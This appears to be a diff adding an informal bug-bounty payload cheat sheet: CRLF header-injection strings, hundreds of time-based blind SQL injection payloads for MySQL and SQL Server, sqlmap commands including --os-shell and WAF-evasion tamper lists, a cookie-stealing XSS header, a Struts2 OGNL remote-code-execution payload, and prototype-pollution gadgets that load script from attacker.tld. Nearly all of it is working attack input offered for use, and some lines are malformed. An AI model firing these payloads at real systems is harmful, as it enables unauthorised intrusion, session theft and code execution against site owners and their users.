@@ -1,0 +1,706 @@
+CRLF INJECTION PAYLOAaDSSs
+
+ /%%0a0aSet-Cookie:crlf=injection
+/%0aSet-Cookie:crlf=injection
+/%0d%0aSet-Cookie:crlf=injection
+/%0dSet-Cookie:crlf=injection
+/%23%0aSet-Cookie:crlf=injection
+/%23%0d%0aSet-Cookie:crlf=injection
+/%23%0dSet-Cookie:crlf=injection
+/%25%30%61Set-Cookie:crlf=injection
+/%25%30aSet-Cookie:crlf=injection
+/%250aSet-Cookie:crlf=injection
+/%25250aSet-Cookie:crlf=injection
+/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
+/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
+/%2F..%0d%0aSet-Cookie:crlf=injection
+/%3f%0d%0aSet-Cookie:crlf=injection
+/%3f%0dSet-Cookie:crlf=injection
+/%u000aSet-Cookie:crlf=injection
+/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
+/%0d%0aheader:header
+/%0aheader:header
+/%0dheader:header
+/%23%0dheader:header
+/%3f%0dheader:header
+/%250aheader:header
+/%25250aheader:header
+/%%0a0aheader:header
+/%3f%0dheader:header
+/%23%0dheader:header
+/%25%30aheader:header
+/%25%30%61header:header
+/%u000aheader:header
+%0AHeader-Test:Toxic Response
+%0A%20Header-Test:Toxic Response
+%20%0AHeader-Test:Toxic Response
+%23%OAHeader-Test:Toxic Response
+%E5%98%8A%E5%98%8DHeader-Test:Toxic Response
+%E5%98%8A%E5%98%8D%0AHeader-Test:Toxic Response
+%3F%0AHeader-Test:Toxic Response
+crlf%0AHeader-Test:Toxic Response
+crlf%0A%20Header-Test:Toxic Response
+crlf%20%0AHeader-Test:Toxic Response
+crlf%23%OAHeader-Test:Toxic Response
+crlf%E5%98%8A%E5%98%8DHeader-Test:Toxic Response
+crlf%E5%98%8A%E5%98%8D%0AHeader-Test:Toxic Response
+crlf%3F%0AHeader-Test:Toxic Response
+%0DHeader-Test:Toxic Response
+%0D%20Header-Test:Toxic Response
+%20%0DHeader-Test:Toxic Response
+%23%0DHeader-Test:Toxic Response
+%23%0AHeader-Test:Toxic Response
+%E5%98%8A%E5%98%8DHeader-Toxic Response
+%E5%98%8A%E5%98%8D%0DHeader-Test:Toxic Response
+%3F%0DHeader-Test:Toxic Response
+crlf%0DHeader-Test:Toxic Response
+crlf%0D%20Header-Test:Toxic Response
+crlf%20%0DHeader-Test:Toxic Response
+crlf%23%0DHeader-TestToxic Response
+crlf%23%0AHeader-Test:Toxic Response
+crlf%E5%98%8A%E5%98%8DHeader-Test:Toxic Response
+crlf%E5%98%8A%E5%98%8D%0DHeader-Test:Toxic Response
+crlf%3F%0DHeader-Test:Toxic Response
+%0D%0AHeader-Test:Toxic Response
+%0D%0A%20Header-Test:Toxic Response
+%20%0D%0AHeader-Test:Toxic Response
+%23%0D%0AHeader-Test:Toxic Response
+\r\nHeader-Test:Toxic Response
+ \r\n Header-Test:Toxic Response
+\r\n Header-Test:Toxic Response
+%5cr%5cnHeader-Test:Toxic Response
+%E5%98%8A%E5%98%8DHeader-Test:Toxic Response
+%E5%98%8A%E5%98%8D%0D%0AHeader-Test:Toxic Response
+%3F%0D%0AHeader-Test:Toxic Response
+crlf%0D%0AHeader-Test:Toxic Response
+crlf%0D%0A%20Header-Test:Toxic Response
+crlf%20%0D%0AHeader-TestToxic Response
+crlf%23%0D%0AHeader-Test:Toxic Response
+crlf\r\nHeader-Test:Toxic Response
+crlf%5cr%5cnHeader-Test:Toxic Response
+crlf%E5%98%8A%E5%98%8DHeader-TestToxic Response
+crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:Toxic Response
+crlf%3F%0D%0AHeader-Test:Toxic ResponseToxic Response
+%0D%0A%09Header-Test:Toxic Response
+crlf%0D%0A%09Header-TestToxic Response
+%250AHeader-Test:Toxic Response
+%25250AHeader-Test:Toxic Response
+%%0A0AHeader-Test:Toxic Response
+%25%30AHeader-Test:Toxic Response
+%25%30%61Header-Test:Toxic Response
+%u000AHeader-Test:Toxic Response
+//www.google.com/%2F%2E%2E%0D%0AHeader-Test:Toxic Response
+/www.google.com/%2E%2E%2F%0D%0AHeader-Test:Toxic Response
+/google.com/%2F..%0D%0AHeader-Test:Toxic Response
+
+
+
+
+
+TIME BAsED BLIND SqL Ijection 
+TEST THIS TWO BFORE THE OTHERS
+email=TOXICKINGTECHQURU@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+email=TOXICKINGTECHQUR@gmail.com' WAITFOR DELAY '0:0:5'--
+
+
+TIME BAsED SQL 
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+if(now()=sysdate(),sleep(5),0)
+'XOR(if(now()=sysdate(),sleep(5),0))XOR'
+'XOR(if(now()=sysdate(),sleep(5*1),0))OR'
+if(now()=sysdate(),sleep(5),0)/"XOR(if(now()=sysdate(),sleep(5),0))OR"/
+if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0))OR"*/
+if(now()=sysdate(),sleep(5),0)/'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0) and 5=5)"/
+SLEEP(5)/*' or SLEEP(5) or '" or SLEEP(5) or "*/
+%2c(select%5*%5from%5(select(sleep(5)))a)
+(select(0)from(select(sleep(5)))v)
+(SELECT SLEEP(5))
+'%2b(select*from(select(sleep(5)))a)%2b'
+(select*from(select(sleep(5)))a)
+1'%2b(select*from(select(sleep(5)))a)%2b'
+,(select * from (select(sleep(5)))a)
+desc%2c(select*from(select(sleep(5)))a)
+-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))
+-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(5))A))
+(SELECT * FROM (SELECT(SLEEP(5)))YYYY)
+(SELECT * FROM (SELECT(SLEEP(5)))YYYY)#
+(SELECT * FROM (SELECT(SLEEP(5)))YYYY)--
+'+(select*from(select(sleep(5)))a)+'
+(select(0)from(select(sleep(5)))v)%2f'+(select(0)from(select(sleep(5)))v)+'"
+(select(0)from(select(sleep(5)))v)%2f*'+(select(0)from(select(sleep(5)))v)+'"+(select(0)from(select(sleep(5)))v)+"*%2f
+(select(0)from(select(sleep(5)))v)/*'+(select(0)from(select(sleep(5)))v)+'"+(select(0)from(select(sleep(5)))v)+"*/
+AND BLIND:
+1 and sleep 5--
+1 and sleep 5
+1 and sleep(5)--
+1 and sleep(5)
+' and sleep 5--
+' and sleep 5
+' and sleep 5 and '1'='1
+' and sleep(5) and '1'='1
+' and sleep(5)--
+' and sleep(5)
+' AnD SLEEP(5) ANd '1
+and sleep 5--
+and sleep 5
+and sleep(5)--
+and sleep(5)
+and SELECT SLEEP(5); #
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+ and sleep 5--
+ and sleep 5
+ and sleep(5)--
+ and sleep(5)
+ and SELECT SLEEP(5); #
+' AND SLEEP(5)#
+" AND SLEEP(5)#
+') AND SLEEP(5)#
+OR BLIND:
+or sleep 5--
+or sleep 5
+or sleep(5)--
+or sleep(5)
+or SELECT SLEEP(5); #
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+ or sleep 5--
+ or sleep 5
+ or sleep(5)--
+ or sleep(5)
+ or SELECT SLEEP(5); #
+' OR SLEEP(5)#
+" OR SLEEP(5)#
+') OR SLEEP(5)#
+
+You can replace AND / OR
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (1337=1337
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337'='1337
+') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ('PBiy'='PBiy
+) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (1337=1337
+)) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((1337=1337
+))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (((1337=1337
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)# 1337
+) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+1 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
++(SELECT 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY))+
+)) AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+) AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+` WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+`) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+`=`1` AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND `1`=`1
+]-(SELECT 0 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY))|[1
+') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ('1337'='1337
+')) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (('1337'='1337
+'))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((('1337'='1337
+' AND (SELECT 3122 FROM (SELECT(SLEEP(5)))YYYY) AND '1337'='1337
+') AND (SELECT 4796 FROM (SELECT(SLEEP(5)))YYYY) AND ('1337'='1337
+')) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (('1337' LIKE '1337
+'))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((('1337' LIKE '1337
+%' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337%'='1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337' LIKE '1337
+") AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ("1337"="1337
+")) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (("1337"="1337
+"))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((("1337"="1337
+" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND "1337"="1337
+") AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ("1337" LIKE "1337
+")) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (("1337" LIKE "1337
+"))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((("1337" LIKE "1337
+" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND "1337" LIKE "1337
+' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) OR '1337'='1337
+') WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+") WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
+RLIKE BLIND:
+You can replace AND / OR
+RLIKE SLEEP(5)--
+' RLIKE SLEEP(5)--
+' RLIKE SLEEP(5)-- 1337
+" RLIKE SLEEP(5)-- 1337
+') RLIKE SLEEP(5)-- 1337
+') RLIKE SLEEP(5) AND ('1337'='1337
+')) RLIKE SLEEP(5) AND (('1337'='1337
+'))) RLIKE SLEEP(5) AND ((('1337'='1337
+) RLIKE SLEEP(5)-- 1337
+) RLIKE SLEEP(5) AND (1337=1337
+)) RLIKE SLEEP(5) AND ((1337=1337
+))) RLIKE SLEEP(5) AND (((1337=1337
+1 RLIKE SLEEP(5)
+1 RLIKE SLEEP(5)-- 1337
+1 RLIKE SLEEP(5)# 1337
+) WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+1 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
++(SELECT 1337 WHERE 1337=1337 RLIKE SLEEP(5))+
+)) AS 1337 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+) AS 1337 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+` WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+`) WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+' RLIKE SLEEP(5) AND '1337'='1337
+') RLIKE SLEEP(5) AND ('1337' LIKE '1337
+')) RLIKE SLEEP(5) AND (('1337' LIKE '1337
+'))) RLIKE SLEEP(5) AND ((('1337' LIKE '1337
+%' RLIKE SLEEP(5) AND '1337%'='1337
+' RLIKE SLEEP(5) AND '1337' LIKE '1337
+") RLIKE SLEEP(5) AND ("1337"="1337
+")) RLIKE SLEEP(5) AND (("1337"="1337
+"))) RLIKE SLEEP(5) AND ((("1337"="1337
+" RLIKE SLEEP(5) AND "1337"="1337
+") RLIKE SLEEP(5) AND ("1337" LIKE "1337
+")) RLIKE SLEEP(5) AND (("1337" LIKE "1337
+"))) RLIKE SLEEP(5) AND ((("1337" LIKE "1337
+" RLIKE SLEEP(5) AND "1337" LIKE "1337
+' RLIKE SLEEP(5) OR '1337'='1337
+') WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+") WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+' WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+" WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
+
+ELT Blind:
+You can replace AND / OR
+' AND ELT(1337=1337,SLEEP(5))--
+' AND ELT(1337=1337,SLEEP(5))-- 1337
+" AND ELT(1337=1337,SLEEP(5))-- 1337
+') AND ELT(1337=1337,SLEEP(5))-- 1337
+') AND ELT(1337=1337,SLEEP(5)) AND ('1337'='1337
+')) AND ELT(1337=1337,SLEEP(5)) AND (('1337'='1337
+'))) AND ELT(1337=1337,SLEEP(5)) AND ((('1337'='1337
+' AND ELT(1337=1337,SLEEP(5)) AND '1337'='1337
+') AND ELT(1337=1337,SLEEP(5)) AND ('1337' LIKE '1337
+')) AND ELT(1337=1337,SLEEP(5)) AND (('1337' LIKE '1337
+'))) AND ELT(1337=1337,SLEEP(5)) AND ((('1337' LIKE '1337
+) AND ELT(1337=1337,SLEEP(5))-- 1337
+) AND ELT(1337=1337,SLEEP(5)) AND (1337=1337
+)) AND ELT(1337=1337,SLEEP(5)) AND ((1337=1337
+))) AND ELT(1337=1337,SLEEP(5)) AND (((1337=1337
+1 AND ELT(1337=1337,SLEEP(5))
+1 AND ELT(1337=1337,SLEEP(5))-- 1337
+1 AND ELT(1337=1337,SLEEP(5))# 1337
+) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+1 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
++(SELECT 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+
+)) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+` WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+`) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+1`=`1` AND ELT(1337=1337,SLEEP(5)) AND `1`=`1
+]-(SELECT 0 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))|[1
+%' AND ELT(1337=1337,SLEEP(5)) AND '1337%'='1337
+' AND ELT(1337=1337,SLEEP(5)) AND '1337' LIKE '1337
+") AND ELT(1337=1337,SLEEP(5)) AND ("1337"="1337
+")) AND ELT(1337=1337,SLEEP(5)) AND (("1337"="1337
+"))) AND ELT(1337=1337,SLEEP(5)) AND ((("1337"="1337
+" AND ELT(1337=1337,SLEEP(5)) AND "1337"="1337
+") AND ELT(1337=1337,SLEEP(5)) AND ("1337" LIKE "1337
+")) AND ELT(1337=1337,SLEEP(5)) AND (("1337" LIKE "1337
+"))) AND ELT(1337=1337,SLEEP(5)) AND ((("1337" LIKE "1337
+" AND ELT(1337=1337,SLEEP(5)) AND "1337" LIKE "1337
+' AND ELT(1337=1337,SLEEP(5)) OR '1337'='FMTE
+') WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+") WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+' WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+" WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+'||(SELECT 0x4c454f67 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||'
+'||(SELECT 0x727a5277 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||'
+'+(SELECT 0x4b6b486c WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+'
+||(SELECT 0x57556971 FROM DUAL WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||
+||(SELECT 0x67664847 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))||
++(SELECT 0x74764164 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5)))+
+')) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+")) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+') AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+") AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
+
+BENCHMARK:
+You can replace AND / OR
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))--
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+" AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+') AND =BENCHMARK(5000000,MD5(0x774c5341))--
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337'='1337
+')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337'='1337
+'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337'='1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337'='1337
+') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337' LIKE '1337
+')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337' LIKE '1337
+'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337' LIKE '1337
+%' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337%'='1337
+' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337' LIKE '1337
+") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ("1337"="1337
+")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (("1337"="1337
+"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((("1337"="1337
+" AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND "1337"="1337
+") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ("1337" LIKE "1337
+")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (("1337" LIKE "1337
+"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((("1337" LIKE "1337
+" AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND "1337" LIKE "1337
+' AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND '1337'='1337
+
+Microsoft SQL Server Blind (Time Based):
+
+If the server is vulnerable you will see a 5 second time delay in response
+
+;waitfor delay '0:0:5'--
+';WAITFOR DELAY '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+") IF (1=1) WAITFOR DELAY '0:0:5'--
+';%5waitfor%5delay%5'0:0:5'%5--%5
+' WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'
+or WAITFOR DELAY '0:0:5'--
+or WAITFOR DELAY '0:0:5'
+and WAITFOR DELAY '0:0:5'--
+and WAITFOR DELAY '0:0:5'
+WAITFOR DELAY '0:0:5'
+Thank you @tOXICKING TEXCHGURU
+;WAITFOR DELAY '0:0:5'--
+;WAITFOR DELAY '0:0:5'
+1 WAITFOR DELAY '0:0:5'--
+1 WAITFOR DELAY '0:0:5'
+1 WAITFOR DELAY '0:0:5'-- 1337
+1' WAITFOR DELAY '0:0:5' AND '1337'='1337
+1') WAITFOR DELAY '0:0:5' AND ('1337'='1337
+1) WAITFOR DELAY '0:0:5' AND (1337=1337
+') WAITFOR DELAY '0:0:5'--
+" WAITFOR DELAY '0:0:5'--
+')) WAITFOR DELAY '0:0:5'--
+'))) WAITFOR DELAY '0:0:5'--
+%' WAITFOR DELAY '0:0:5'--
+") WAITFOR DELAY '0:0:5'--
+")) WAITFOR DELAY '0:0:5'--
+"))) WAITFOR DELAY '0:0:5'--
+    0'XOR(if(now()=sysdate(),sleep(15),0))XOR'
+0'XOR(if(now()=sysdate(),sleep(6),0))XOR'
+0'XOR(if(now()=sysdate(),sleep(0),0))XOR'
+0'XOR(if(now()=sysdate(),sleep(15),0))XOR'
+0'XOR(if(now()=sysdate(),sleep(3),0))XOR'
+0'XOR(if(now()=sysdate(),sleep(0),0))XOR'
+0'XOR(if(now()=sysdate(),sleep(6),0))XOR'
+
+
+
+SSRF BEST TUTORIALS
+
+https://infosecwriteups.com/setup-your-private-burp-collaborator-for-ssrf-xxe-fd6cf01c8ca
+
+SQL MAP Commands
+
+ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs --thrads=4
+  sqlmap.py -u “<URL>” --batch --banner
+  
+  sqlmap -u http://192.168.202.160/ –crawl=1
+  sqlmap.py -u “<URL>” --form --batch --banner
+  sqlmap -u http://example.com/admin.aspx –csrf-token=<csrf token>
+  waf
+  sqlmap.py -u “<URL>” --tamper=apistrophemask -v 3
+MYSQL tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+  sqlmap -u “https://target_site.com/page?p1=value1” --os-shell
+  sqlmap -u “https://target_site.com/page?p1=value1” --dbms=mysql
+
+
+Memmory corraption Book 
+
+http://www.cse.psu.edu/~gxt29/teaching/cs447s19/slides/03memVul_part2.pdf
+
+
+
+XSS 
+X-Forwarded-Host: bing.com"><img src/onerror=prompt(document.cookie)>
+
+FOR RCE INJECT THE FOLLOWING PHP PAYLOAD FOR SIRIALIZATION
+USE EXIFTOOL
+Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(3*3)).(#ros.flush())}
+
+Prototype Pollution
+?__proto__[test]=test
+?__proto__.test=test
+?__proto__[test]=test
+#__proto__[test]=test
+?__proto__.test=test
+?constructor.prototype.test=test
+?__proto__.test=test
+?__proto__[test]=test
+?__proto__[test]={"json":"value"}
+?__proto__.test=test
+?constructor.prototype.test=test
+?__proto__.array=1|2|3
+?__proto__[test]=test
+?constructor[prototype][test]=test
+?__proto__[test]=test
+?constructor[prototype][test]=test
+#__proto__[test]=test
+?__proto__[test]=test
+?constructor[prototype][test]=test 	
+ 	?__proto__.test=test
+  ?constructor.prototype.test=test
+  ?__proto__[NUMBER]=test
+?__proto__[123]=test
+
+pROTOTYPE _
+Script Gadgets
+?__proto__[innerHTML]=<img/src/onerror%3dalert(1)>
+?__proto__[context]=<img/src/onerror%3dalert(1)>
+&__proto__[jquery]=x
+__proto__[url][]=data:,alert(1)//
+&__proto__[dataType]=script
+?__proto__[url]=data:,alert(1)//
+&__proto__[dataType]=script
+&__proto__[crossDomain]=
+?__proto__[s?__proto__[url]=data:,alert(1)
+?__proto__[div][0]=1
+&__proto__[div][1]=<img/src/onerror%3dalert(1)>
+?__proto__[preventDefault]=x
+&__proto__[handleObj]=x
+&__proto__[deleg?__proto__[srcdoc][]=<script>alert(1)</script>
+ateTarget]=<img/src/onerror%3dalert(1)>
+?__proto__[attrs][src]=1
+&__proto__[src]=data:,alert(1)//
+?__proto__[BOOMR]=1
+&__proto__[url]=//attacker.tld/js.js
+?__proto__[sourceURL]=%E2%80%A8%E2%80%A9alert(1)\
+?__proto__[*][]=onload
+?__proto__[innerText]=<script>alert(1)</script>
+?__proto__[whiteList][img][0]=onerror
+&__proto__[whiteList][img][1]=src
+
+?__proto__[hif][]=javascript:alert(1)
+?__proto__[ALLOWED_ATTR][0]=onerror
+&__proto__[ALLOWED_ATTR][1]=src
+
+?__proto__[documentMode]=9
+?__proto__[*%20ONERROR]=1
+&__proto__[*%20SRC]=1
+
+?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//
+
+?__proto__[tagName]=img
+&__proto__[src][]=x:
+&__proto__[onerror][]=alert(1)
+?__proto__[src]=data:,alert(1)//
+
+?__proto__[SRC]=<img/src/onerror%3dalert(1)>
+?__proto__[xxx]=alert(1)
+?__proto__[onload]=alert(1)
+?__proto__[script][0]=1
+&__proto__[script][1]=<img/src/onerror%3dalert(1)>
+?__proto__[4]=a':1,[alert(1)]:1,'b
+&__proto__[5]=,
+
+?__proto__[onerror]=alert(1)
+?__proto__[html]=<img/src/onerror%3dalert(1)>
+?__proto__[div][intro]=<img%20src%20onerror%3dalert(1)>
+?__proto__[v-if]=_c.constructor('alert(1)')()
+?__proto__[attrs][0][name]=src
+&__proto__[attrs][0][value]=xxx
+&__proto__[xxx]=data:,alert(1)//
+&__proto__[is]=script
+?__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()
+?__proto__[data]=a
+&__proto__[template][nodeType]=a
+&__proto__[template][innerHTML]=<script>alert(1)</script>
+?__proto__[props][][value]=a
+&__proto__[name]=":''.constructor.constructor('alert(1)')()," 	XSS 	[1] 	st98_
+Vue.js 	?__proto__[template]=<script>alert(1)</script>
+
+?__proto__[Config][SiteOptimization][enabled]=1
+&__proto__[Config][SiteOptimization][recommendationApiURL]=//attacker.tld/json_cors.php?
+?__proto__[customScriptSrc]=//attacker.tld/xss.js
+
+?__proto__[lng]=cimode
+&__proto__[appendNamespaceToCIMode]=x
+&__proto__[nsSeparator]=<img/src/onerror%3dalert(1)>
+?__proto__[lng]=a
+&__proto__[a]=b
+&__proto__[obj]=c
+&__proto__[k]=d
+&__proto__[d]=<img/src/onerror%3dalert(1)>
+?__proto__[lng]=a
+&__proto__[key]=<img/src/onerror%3dalert(1)>
+
+?__proto__[cookieName]=COOKIE%3DInjection%3B
+?__proto__[arrow][style]=color:red;transition:all%201s
+&__proto__[arrow][ontransitionend]=alert(1)
+?__proto__[popper][style]=color:red;transition:all%201s
+&__proto__[popper][ontransitionend]=alert(3)
+?__proto__[dataHost]=attacker.tld/js.js%23
+?x=x
+&x[constructor][__parseStyleElement][innerHTML]=<img/src/onerror%3dalert(1)>
+?__proto__[trustedTypes]=x
+&__proto__[emptyHTML]=<img/src/onerror%3dalert(1)>
+?__proto__[vtp_enableRecaptcha]=1
+&__proto__[srcdoc]=<script>alert(1)</script>
+?__proto__[q][0][0]=require
+&__proto__[q][0][1]=x
+&__proto__[q][0][2]=https://www.google-analytics.com/gtm/js%3Fid%3DGTM-WXTDWH7
+?__proto__[q][0][0]=require
+&__proto__[q][0][1]=x
+&__proto__[q][0][2]=https://www.google-analytics.com/gtm/js%3Fid%3DGTM-WXTDWH7
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
